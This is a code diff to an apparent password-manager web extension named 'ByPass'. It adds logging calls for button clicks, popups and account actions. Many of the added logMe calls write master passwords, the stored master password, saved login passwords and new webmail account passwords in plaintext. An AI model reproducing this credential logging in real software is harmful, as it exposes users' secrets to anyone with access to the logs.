@@ -2568,7 +2568,9 @@ $(document).ready(function() {
   $(".loginTitle").innerText = "Login to " + websiteP;
 
   $(".mp8").click(function() {
-  console.log("home");
+    logMe("user","Home button clicked","account detail page","");
+
+    console.log("home");
   document.getElementById("p7").style.display = "block";
   document.getElementById("p8").style.display = "none";
   document.getElementById("p9").style.display = "none";
@@ -2580,6 +2582,7 @@ $(document).ready(function() {
 
 });
 $(".mp4").click(function() {
+  logMe("user","Home button clicked","wizard page","");
   console.log("home");
   document.getElementById("p7").style.display = "block";
   document.getElementById("p8").style.display = "none";
@@ -2593,6 +2596,8 @@ $(".mp4").click(function() {
 
 });
 $(".mp5").click(function() {
+  logMe("user","Home button clicked","enter website page","");
+
   console.log("home");
   document.getElementById("p7").style.display = "block";
   document.getElementById("p8").style.display = "none";
@@ -2606,6 +2611,8 @@ $(".mp5").click(function() {
 
 });
 $(".mp6").click(function() {
+  logMe("user","Home button clicked","create or login page","");
+
   // console.log("home");
   document.getElementById("p7").style.display = "block";
   document.getElementById("p8").style.display = "none";
@@ -2618,6 +2625,8 @@ $(".mp6").click(function() {
 
 });
 $(".mp9").click(function() {
+  logMe("user","Home button clicked","edit account page","");
+
   console.log("home");
   document.getElementById("p7").style.display = "block";
   document.getElementById("p8").style.display = "none";
@@ -2704,6 +2713,7 @@ request.onsuccess = function() {
 
 // functions
 function passwordConfirmation() {
+
   localStorage.setItem("flag", 0);
 
   console.log("passwordConfirmation Called...");
@@ -2714,6 +2724,9 @@ function passwordConfirmation() {
   var transaction = db.transaction(["master"], "readwrite");
   var objectStore = transaction.objectStore("master");
   var request = objectStore.get(masterEmail);
+
+  logMe("user","Create ByPass Account button clicked","Create ByPass Account page","master Email: " + masterEmail + "password: " + password + "masterRePassword: " + masterRePassword);
+
   request.onerror = function(event) {
     // Handle errors!
   };
@@ -2745,7 +2758,9 @@ function passwordConfirmation() {
     if ($("#password").val() == $("#masterRePassword").val()) {
          if ($("#password").val() == "" &&  $("#masterRePassword").val() == "") {
            alert("All the fields required !");
-           }
+           logMe("system","popup","creating bypass account","All the fields required !  " + "master Email: " + masterEmail + "password: " + password + "masterRePassword: " + masterRePassword );
+
+         }
           else
           {
 
@@ -2761,13 +2776,18 @@ function passwordConfirmation() {
               // e.preventDefault();
 
             } else {
-              alert("Please choose a strong password!");
+                 logMe("system","popup","creating bypass account","Please choose a strong password!  " + "master Email: " + masterEmail + "password: " + password + "masterRePassword: " + masterRePassword );
+
+                 alert("Please choose a strong password!");
+
             }
 
           }
             else {
               // if (strength != "4") {
+              logMe("system","popup","creating bypass account","Please enter a valid email.example@email.com  " + "master Email: " + masterEmail + "password: " + password + "masterRePassword: " + masterRePassword );
               alert("Please enter a valid email.\nexample@email.com");
+
             // }
             }
               // $result.text(email + " is not valid :(");
@@ -2775,7 +2795,8 @@ function passwordConfirmation() {
             }
          }
          else {
-           alert("Your passwords are not matched!")
+      logMe("system","popup","creating bypass account","Your passwords are not matched!  " + "master Email: " + masterEmail + "password: " + password + "masterRePassword: " + masterRePassword );
+      alert("Your passwords are not matched!")
          }
        }
   };
@@ -2802,7 +2823,8 @@ function masterPassword() {
   if (pKey != 1) {
     console.log(store);
     console.log("time to do something different...");
-  } else if (pKey == 7) {
+  } else if (pKey == 7)
+  {
     let req = store.get(7);
     req.onsuccess = function(event) {
       let note = event.target.result;
@@ -2973,7 +2995,8 @@ function masterPassword() {
       alert('error getting note 1 ' + event.target.errorCode);
     }
 
-  } else {
+  } else
+    {
     let req = store.get(1);
     var flagss = localStorage.getItem("flag");
     req.onsuccess = function(event) {
@@ -2997,6 +3020,8 @@ function masterPassword() {
         // console.log(note.masterEmail);
         renderRows();
       }else if (note.masterPassword == masterPassword) {
+        logMe("user","get access button clicked","confirm master password","DB master password: " + note.masterPassword + "user input master password" + masterPassword);
+
         console.log("masterPassword (success) Called...");
         localStorage.setItem("flag", 1);
 
@@ -3016,7 +3041,8 @@ function masterPassword() {
         renderRows();
       } else {
         console.log("masterPassword is not correct...");
-        alert("You entered a incorrect password...")
+       alert("You entered a incorrect password...");
+
 
         // alert("You need to sign up first!");
       }
@@ -3071,6 +3097,7 @@ function addMaster(e) {
   //   }
   // }
   console.log("About to add " + masterEmail + "/" + password + "/" + masterRePassword);
+  logMe("user","create bypass account button clicked","create bypass account page","Bypass account Email: " + masterEmail + "Bypass account password: "+ password +"Bypass account confirm password: "+masterRePassword);
 
   //Get a transaction
   //default for OS list is all, default for type is read
@@ -3139,6 +3166,8 @@ function addMaster(e) {
 
 
 function dontLoadSignUp() {
+  logMe("system","auto check","masterpassword confirm","");
+
   console.log("dontLoadSignUp called ....");
   var masterPassword = $("#masterPassword").val();
 
@@ -3158,6 +3187,8 @@ function dontLoadSignUp() {
 
     let note = event.target.result;
     if (note) {
+
+      logMe("system","create logout button","create bypass account page","Bypass logout email: " + note.masterEmail );
 
       console.log("user 1  found...");
       $(".logout").each(function(index) {
@@ -3235,6 +3266,8 @@ function dontLoadSignUp() {
 }
 
 function addFromLogin() {
+  logMe("user","login account button clicked","create or login page","");
+
   console.log("addFromLogin in out side htmls Called...");
 
   var loginEmail = $("#loginEmail").val();
@@ -3277,6 +3310,7 @@ function addFromLogin() {
   //Perform the add
   if (validateEmail(loginEmail)) {
 
+    logMe("user","add account button clicked","login page","Email: "+ loginEmail + "password: "+ loginPassword + "website name: "+loginWebsite);
 
   var loginAcc = {
     // masterEmail: masterEmail,
@@ -3300,26 +3334,38 @@ function addFromLogin() {
   // console.log("Create account added...");
   // }
   if (loginWebsite.includes("amazon") || loginWebsite.includes("Amazon") ) {
+    logMe("system","popup","login page","Your account has been added to ByPass Do you want to login right now?");
 
     var r = confirm("Your account has been added to ByPass \nDo you want to login right now?");
     if (r == true) {
       loginToPage("nothing", loginEmail, loginPassword);
+      logMe("user","login after add login account","user answered OK   -   login page","login Email: "+ loginEmail + "loginPassword: "+loginPassword);
+
       setTimeout(function() {
+        logMe("system","closeTab","login page","");
         win = window.close();
       }, 1000);
     } else {
+      logMe("user","login after add login account","user answered CANCEL","");
+      logMe("system","closeTab","login page","");
+
       closeTab();
     }
   } else {
     alert("Your account has been added to ByPass.");
+    logMe("system","login after add login account","login page"," Your account has been added to ByPass.  -  login Email: "+ loginEmail + "loginPassword: "+loginPassword);
+
     setTimeout(function() {
       win = window.close();
+      logMe("system","closeTab","login page","");
     }, 1000);
   }
 }
 else {
   alert("Enter valid email...");
-}
+    logMe("system","popup","login page","Enter valid email...");
+
+  }
   // var r = confirm("Your account has been added to ByPass \nDo you want to login right now?");
   // if (r == true) {
   //   loginToPage("nothing", loginEmail, loginPassword);
@@ -3334,7 +3380,7 @@ else {
 
 function addFromCreate() {
   console.log("addFromCreate in out side htmls Called...");
-
+  logMe("user","create account button clicked","create account page","");
 
   var createName = $("#createFirstName").val();
   var createEmail = $("#createEmail").val();
@@ -3345,9 +3391,9 @@ function addFromCreate() {
   var transaction = db.transaction(["accounts"], "readwrite");
   var store = transaction.objectStore("accounts");
 
-
        if ($("#createFirstName").val() == "" ||  $("#createLastName").val() == "" ||  $("#createdateOfBirth").val() == "" ||  $("#createEmail").val() == "" ||  $("#createPassword").val() == "" ) {
          if (createWebsite.includes("webmail") || createWebsite !== "webmail") {
+           logMe("user","website name entered","create account page","websitename: Webmail" );
            ffnn = document.querySelector(".fnameSection").value;
            llnn = document.querySelector(".lnameSection").value;
            dbs = document.querySelector(".datebirthSection").value;
@@ -3378,6 +3424,8 @@ function addFromCreate() {
                }
                // var attr = {"local_part":res[0],"domain":"montreal-events.com","name":"ByPass User","quota":"200","password":createPassword,"password2":createPassword,"active":"1"}
                var attr = {"local_part":res[0],"domain":"webmail.com","name":"ByPass User","quota":"10","password":createPassword,"password2":createPassword,"active":"1"}
+               logMe("Webmail Server","request","create an account request to webmail","success - Email: " +res[0]+ "@webmail.com/password: " +createPassword);
+
                // alert(createWebsite + " / " + createEmail + " / " + createPassword);
                // request.send("UserID=897987&FirstName=AMAZON&LastName=nuAlle&Email="+loginEmail+"&Password="+loginPassword+"&Mobile=0123&BirthDay=222")
                // request.send("UserID=897987&FirstName=" + createName + "&LastName=nuAlle&Email=" + createEmail + "&Password=" + createPassword + "&Mobile=0123&BirthDay=01")
@@ -3394,8 +3442,9 @@ function addFromCreate() {
 
 
 
+             logMe("user","add account button clicked","Create page","Email: "+ createEmail + "password: "+ createPassword + "website name: "+createWebsite);
 
-               var createAcc = {
+             var createAcc = {
                  // masterEmail: masterEmail,
                  loginEmail: createEmail,
                  loginPassword: createPassword,
@@ -3407,8 +3456,11 @@ function addFromCreate() {
                var request = store.add(createAcc);
                console.log("Create account added...");
                alert("Your account has been created and added to ByPass.");
-               setTimeout(function() {
-                 win = window.close();
+               logMe("system","popup","create page"," Your account has been created and added to ByPass..  -  create Email: "+ createEmail + " create Password: "+ createPassword+" webiste name: "+createWebsite);
+
+
+             setTimeout(function() {
+                 // win = window.close();
                }, 1000);
                // if (loginEmail != "") {
                //   var request = store.add(loginAcc);
@@ -3422,13 +3474,18 @@ function addFromCreate() {
            else {
              // if (strength != "4") {
              alert("Please enter a valid email.\nexample@email.com");
-           // }
+             logMe("system","popup","create page"," Please enter a valid email.example@email.com  -  create Email: "+ createEmail + " create Password: "+ createPassword+" webiste name: "+createWebsite);
+
+             // }
            }
              // $result.text(email + " is not valid :(");
              // $result.css("color", "red");
-         } else {
+         }
+         else {
            alert("All the fields required !");
-          }
+           logMe("system","popup","create page"," All the fields required !-  create Email: "+ createEmail + " create Password: "+ createPassword+" webiste name: "+createWebsite);
+
+         }
          }
         else
         {
@@ -3471,7 +3528,9 @@ function addFromCreate() {
               var request = store.add(createAcc);
               console.log("Create account added...");
               alert("Your account has been created and added to ByPass");
-              setTimeout(function() {
+              logMe("system","popup","create page"," Your account has been created and added to ByPass..  -  create Email: "+ createEmail + " create Password: "+ createPassword+" webiste name: "+createWebsite);
+
+            setTimeout(function() {
                 win = window.close();
               }, 1000);
               // if (loginEmail != "") {
@@ -3486,7 +3545,9 @@ function addFromCreate() {
           else {
             // if (strength != "4") {
             alert("Please enter a valid email.\nexample@email.com");
-          // }
+            logMe("system","popup","create page"," Please enter a valid email.example@email.com  -  create Email: "+ createEmail + " create Password: "+ createPassword+" webiste name: "+createWebsite);
+
+            // }
           }
             // $result.text(email + " is not valid :(");
             // $result.css("color", "red");
@@ -3502,13 +3563,19 @@ function logout() {
   // onsuccess handler
   console.log("logout.....");
 
+  logMe("user","logout button clicked","logout called","");
 
   var r = confirm("Are you sure you want to logout?");
+  logMe("system","popup","logout button clicked","Are you sure you want to logout?");
+
   if (r == true) {
+    logMe("user","popup","logout button clicked","user seleceted - OK");
+
     var objectStore = db.transaction(["master"], "readwrite").objectStore("master").delete(1);
     var objectStoreClear = db.transaction(["accounts"], "readwrite").objectStore("accounts").clear();
     win = window.close();
   } else {
+    logMe("user","popup","logout button clicked","user seleceted - Cancel");
 
   }
   // objectStore.onsuccess = function(event) {
